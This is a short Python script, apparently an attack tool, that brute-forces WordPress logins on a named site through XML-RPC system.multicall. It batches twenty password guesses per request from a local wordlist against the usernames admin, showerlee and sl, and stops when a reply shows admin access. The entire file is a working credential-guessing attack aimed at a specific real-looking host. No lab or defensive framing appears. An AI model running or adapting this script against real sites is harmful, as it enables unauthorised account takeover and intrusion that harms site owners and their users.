#!/usr/bin/env python3
"""showerlee xmlrpc multicall brute"""
import urllib.request, sys

URL = "http://showerlee.com/xmlrpc.php"
pwds = [l.strip() for l in open("/tmp/sl_pass.txt") if l.strip()]

def multicall(user, batch):
    body = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for p in batch:
        body += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{user}</string></value><value><string>{p}</string></value></data></array></value></data></array></value></member></struct></value>'
    body += '</data></array></value></param></params></methodCall>'
    try:
        req = urllib.request.Request(URL, data=body.encode(), headers={"Content-Type":"text/xml"})
        r = urllib.request.urlopen(req, timeout=12).read().decode("utf-8","ignore")
        return r
    except Exception as e:
        return f"ERR:{str(e)[:30]}"

for user in ["admin","showerlee","sl"]:
    print(f"--- {user} ---", flush=True)
    for i in range(0, len(pwds), 20):
        batch = pwds[i:i+20]
        r = multicall(user, batch)
        if "isAdmin" in r:
            print(f"!!! HIT {user} batch={batch[:4]}", flush=True)
            sys.exit(0)
        if i % 1000 == 0:
            print(f"  {i}/{len(pwds)}", flush=True)
print("DONE")
